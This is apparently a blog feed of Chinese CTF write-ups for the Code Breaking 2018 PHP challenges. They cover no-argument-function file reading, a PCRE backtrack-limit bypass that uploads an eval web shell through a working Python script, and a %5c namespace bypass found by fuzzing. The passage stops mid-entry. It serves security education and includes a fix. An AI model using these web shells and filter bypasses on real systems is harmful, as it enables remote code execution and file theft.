class="line">?code=file_get_contents(next(array_reverse(scandir(dirname(getcwd())))));</span><br><span class="line"></span><br><span class="line">Warning: file_get_contents(flag_phpbyp4ss): failed to open stream: No such file or directory in /var/www/html/index.php(3) : eval()&apos;d code on line 1</span><br></pre></td></tr></table></figure></p><p>发现报错了，我们找不到这个文件，因为没有<code>../</code>上跳呀，这该怎么办呢？<br>这里我们发现有函数可以更改当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir ( string $directory ) : bool</span><br></pre></td></tr></table></figure></p><p>将 PHP 的当前目录改为 directory。<br>所以我们这里在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname(getcwd())</span><br></pre></td></tr></table></figure></p><p>进行如下设置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(dirname(getcwd()))</span><br></pre></td></tr></table></figure></p><p>这样我们的当前目录就在<code>/var/www</code>下了<br>但此时，我们的值变为了bool值，我们为了遍历目录，需要让他变回来，所以我们先进行目录上跳<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(dirname(chdir(dirname(getcwd()))));</span><br><span class="line"></span><br><span class="line">string(1) &quot;.&quot;</span><br></pre></td></tr></table></figure></p><p>再列目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(chdir(dirname(getcwd())))));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>然后就回到了之前的问题了，我们直接取文件，读取即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p><p>即可拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这种开放式的题目非常有趣，可以帮助我们了解许多php黑魔法和各种组合，我相信方法远不止这3种，欢迎各位讨论！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于合天智汇</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本次是phplimit这道题，本篇文章提供了3种解法，即如何利用无参数函数进行RCE/任意文件读取&lt;/p&gt;
&lt;h2 id=&quot;题目概述&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 Code Breaking(2) &amp; pcrewaf</title>
    <link href="http://skysec.top/2019/03/10/2018-Code-Breaking-2-pcrewaf/"/>
    <id>http://skysec.top/2019/03/10/2018-Code-Breaking-2-pcrewaf/</id>
    <published>2019-03-10T04:59:06.000Z</published>
    <updated>2019-03-12T07:00:10.417Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>题目源码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>题目源码比较清晰，应该是一个上传问题，我们依次解读一下：<br>首先我们确定上传目录<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br></pre></td></tr></table></figure></p><p>然后我们上传的文件内容会被读取<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br></pre></td></tr></table></figure></p><p>紧接着内容会进入正则进行匹配,以判断我们上传的文件内容里是否有php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果带有phg代码，贼会打印<code>bad request</code><br>若不带有php代码，则会将我们的文件进行保存<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">$path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br></pre></td></tr></table></figure></p><p>然后在http返回头里给我们文件路径<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么现在思路应该很清晰了：题目并没有禁止我们上传php文件，但是对文件内容进行了过滤，禁止我们写入php代码。<br>所以现在的思路应该就是：bypass正则<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br></pre></td></tr></table></figure></p><p>上传php文件getshell</p><h2 id="正则分析"><a href="#正则分析" class="headerlink" title="正则分析"></a>正则分析</h2><p>当我们输入一个正常的php文件内容时<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可以看到正则的全部流程如下<br>首先正则开始寻找<code>&lt;</code><br><img src="/images/2019-03-05-15-55-33.png" alt=""><br>找到<code>&lt;</code>后，然后正则再开始寻找<code>?</code><br><img src="/images/2019-03-05-15-55-43.png" alt=""><br>找到<code>&lt;?</code>后，正则开始匹配<code>.*</code><br><img src="/images/2019-03-05-15-55-54.png" alt=""><br>可以在step4中看到，正则因为<code>.*</code>匹配上了<code>&lt;?</code>后所有字符，但此时正则没有结束，又开始继续寻找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-05-15-56-03.png" alt=""><br>于是正则开始回溯，在末位找到<code>&gt;</code><br><img src="/images/2019-03-05-15-56-20.png" alt=""><br><img src="/images/2019-03-05-15-56-31.png" alt=""><br><img src="/images/2019-03-05-15-57-26.png" alt=""><br>所以这里的正则大致意思可以明确为，寻找<code>&lt;?</code>开头和<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p>结尾的字符串。<br>那么我们怎么绕过呢？<br>一般情况下，我们会思考能否绕过php tags<br>例如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&lt;%=</span><br><span class="line">&lt;%, %&gt;</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?</span>=</span><br></pre></td></tr></table></figure></p><p>那我们能否用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= phpinfo();</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>来绕过过滤呢？<br>答案显然是否定的，我们注意到题目的php版本号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Tue, 05 Mar 2019 08:19:19 GMT</span><br><span class="line">&lt; Server: Apache/2.4.25 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.1.26</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 3965</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure></p><p>这里是php7，我们观察到官方手册<br><img src="/images/2019-03-05-16-19-55.png" alt=""><br>在php7中，这些tags都已经被移除，我们无法靠这个方式去bypass正则，那么应该如何去解呢？</p><h2 id="php正则回溯法"><a href="#php正则回溯法" class="headerlink" title="php正则回溯法"></a>php正则回溯法</h2><p>这里要讲到ph牛的一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</span><br></pre></td></tr></table></figure></p><p>个人感觉ph解析的非常到位，我这里简单概述一下<br>我们从上面的正则流程应该能看出一些端倪，在step3到step4的时候，正则匹配完整个字符串，但因为正则没有结束，所以从后往前开始回溯寻找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p>那么有没有可能我们让他一直回溯，一直难以找到，直到我们达成正则表达式的拒绝服务攻击（reDOS）呢？<br>我们不妨构造如下payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="comment">//skyskyskyskyskyskyskyskysky........sky</span></span><br></pre></td></tr></table></figure></p><p>（省略号代表n多sky）<br>这里一直到step3都是和之前一样，但从回溯开始就发生了变化：<br>首先我们结尾没有用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p>所以正则需要不断从后往前回溯，一直找到phpinfo()后的那个分号<br><img src="/images/2019-03-05-16-24-50.png" alt=""><br><img src="/images/2019-03-05-16-25-08.png" alt=""><br>我们可以看到正则匹配次数会随我们的sky增长而增长。<br>这样显然是不行的，因为我们的payload后的sky字符串可以无限延长，那么正则匹配次数不可能达到那么大的数值。所以它会不会有一个上限呢？<br>我们可以测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(ini_get(&apos;pcre.backtrack_limit&apos;));</span><br><span class="line">string(7) &quot;1000000&quot;</span><br></pre></td></tr></table></figure></p><p>可以发现次数为100万次，那么如果超过100万次会怎么样呢？<br>我们继续测试：<br>正常匹配成功情况下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo(); //aaa&apos;));</span><br><span class="line">int(1)</span><br></pre></td></tr></table></figure></p><p>返回了1<br>正常匹配失败情况下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, &apos;2333333&apos;));</span><br><span class="line">int(0)</span><br></pre></td></tr></table></figure></p><p>回溯达到上限情况下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo();//&apos;.str_repeat(&apos;a&apos;, 1000000)));</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure></p><p>我们发现返回了false</p><h2 id="漏洞点攻击"><a href="#漏洞点攻击" class="headerlink" title="漏洞点攻击"></a>漏洞点攻击</h2><p>既然我们发现达到回溯上限会返回false，我们再看一遍题目的正则<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以构造如下文本内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="comment">//'.str_repeat('a', 1000000)</span></span><br></pre></td></tr></table></figure></p><p>这样达到回溯上限后，is_php就会<code>return false</code><br>那么往下的if判断中得到的结果就会为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure></p><p>我们自然就避开了过滤，达到了文件上传的目的</p><h2 id="payload编写与getflag"><a href="#payload编写与getflag" class="headerlink" title="payload编写与getflag"></a>payload编写与getflag</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">'&lt;?php eval($_REQUEST[sky]);//'</span>+<span class="string">'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://106.14.114.127:22001/index.php'</span>, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">path = r.headers[<span class="string">'Location'</span>]</span><br><span class="line">url = <span class="string">'http://106.14.114.127:22001/'</span>+path</span><br><span class="line"><span class="comment"># print url</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="comment"># 'sky':"var_dump(scandir('../../../'));"</span></span><br><span class="line"><span class="string">'sky'</span>:<span class="string">"var_dump(file_get_contents('../../../flag_php7_2_1s_c0rrect'));"</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure><p>我们运行即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python sky.py</span><br><span class="line">string(38) &quot;flag&#123;216728a834fb4c1e0bc6893e135f436e&#125;&quot;</span><br></pre></td></tr></table></figure></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>参照之前的测试，我们发现回溯失败的时候返回是false，而正常情况是0或者1，所以这里我们只要在if判断时，使用<code>===</code>即可，如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>不得不膜一下p神，为许多正则Bypass提供了这么多奇技淫巧，这一点和之前的<code>\</code>打头的正则Bypass都能在日后测试中为我们拓宽攻击面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于合天智汇</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目概述&quot;&gt;&lt;a href=&quot;#题目概述&quot; class=&quot;headerlink&quot; title=&quot;题目概述&quot;&gt;&lt;/a&gt;题目概述&lt;/h2&gt;&lt;p&gt;题目源码如下&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 Code Breaking(1) &amp; function</title>
    <link href="http://skysec.top/2019/03/10/2018-Code-Breaking-1-function/"/>
    <id>http://skysec.top/2019/03/10/2018-Code-Breaking-1-function/</id>
    <published>2019-03-10T04:59:00.000Z</published>
    <updated>2019-05-01T05:54:45.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Code Breaking是ph牛搭建的代码审计挑战赛：<a href="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a><br>刚发布的时候一直忙于开展研究生的生活和一些琐事，没法认真研究和学习，最近闲下来了，于是打算填下这个坑~<br>题目ph牛均已开源至github：<a href="https://github.com/phith0n/code-breaking（必须star" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking（必须star</a> XD）</p><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码言简意赅，首先是希望我们输入两个参数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p><p>其中双问号为三元运算表达式，等价于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p><p>即输入两个参数，若输入，则取我们的输入，否则为空<br>然后是对<code>$_GET[&#39;action&#39;]</code>的正则表达式过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)</span><br></pre></td></tr></table></figure></p><p>如果不被匹配到正则，则可以进行如下操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><h2 id="漏洞点思考"><a href="#漏洞点思考" class="headerlink" title="漏洞点思考"></a>漏洞点思考</h2><p>题目意思也很简单，我们的关注点应该停留到正则匹配上，因为一旦绕过正则，则可以进行危险函数构造，成功getshell或是读取文件，我们先来看一下正则<code>/^[a-z0-9_]*$/isD</code>的意思：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/i 不区分大小写</span><br><span class="line">/s 匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[ \f\n\r\t\v]</span><br><span class="line">/D 如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure></p><p>那么很显然，所有以数字，字母，下划线等开头的value都会被过滤，我们无法进入下面的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><p>那么现在的目的很简单：<br>按照正则的意思，找到一个不是以数字，字母，下划线等开头的value，同时可以正常执行函数<br>我们曾经有如下正则Bypass的样例<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(.*)flag(.*)$/'</span>, $payload))</span><br></pre></td></tr></table></figure></p><p>对于<code>^</code>开头，<code>$</code>结尾的正则，如果用<code>.</code>进行任意字符匹配，那么则不包括换行符<br>所以这种情况我们可以用<code>%0a</code>进行bypass<br><img src="/images/2019-03-03-19-42-23.png" alt=""><br><img src="/images/2019-03-03-19-42-36.png" alt=""><br>这里我们利用%0a打头，成功bypass正则，达到任意input，那么我们也没有相同的思路去bypass现在的正则呢？<br>既然要顺应正则的意思，我们不妨看看有没有什么特殊字符可以达到一样的效果，不妨进行字符fuzz</p><h2 id="字符fuzz"><a href="#字符fuzz" class="headerlink" title="字符fuzz"></a>字符fuzz</h2><p>既然要找一个这样满足条件的字符，我们可以进行fuzz<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">tmp = hex(i)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> len(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">tmp = <span class="string">'0'</span>+hex(i)[<span class="number">2</span>:]</span><br><span class="line">tmp = <span class="string">'%'</span>+tmp</span><br><span class="line">url = <span class="string">'http://localhost:22000/?action='</span>+tmp+<span class="string">'var_dump&amp;arg=23333'</span></span><br><span class="line">r = requests.get(url=url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'23333'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">print</span> url</span><br></pre></td></tr></table></figure></p><p>可以得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string(0) &quot;&quot;</span><br><span class="line">string(5) &quot;23333&quot;</span><br><span class="line"></span><br><span class="line">http://106.14.114.127:22000/?action=%5cvar_dump&amp;arg=23333</span><br><span class="line">[Finished in 5.3s]</span><br></pre></td></tr></table></figure></p><p>我们发现当且仅当使用<code>%5c</code>打头时，我们可以正常运行<code>var_dump()</code>，并且成功满足正则。<br>那么这是为什么呢？<br>ph牛有如下总结<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php里默认命名空间是\，所有原生函数和类都在这个命名空间中。</span><br><span class="line">普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；</span><br><span class="line">而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。</span><br><span class="line">如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</span><br></pre></td></tr></table></figure></p><p>同时我们参考php手册<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.php.net/manual/zh/language.namespaces.rationale.php</span><br></pre></td></tr></table></figure></p><p>其中有如下样例代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">my</span>\<span class="title">name</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> MYCONST = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> MyClass;</span><br><span class="line">$c = <span class="keyword">new</span> \my\name\MyClass;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">namespace</span>\<span class="title">MYCONST</span>;</span><br><span class="line">$d = <span class="keyword">__NAMESPACE__</span> . <span class="string">'\MYCONST'</span>;</span><br><span class="line"><span class="keyword">echo</span> constant($d); </span><br><span class="line"><span 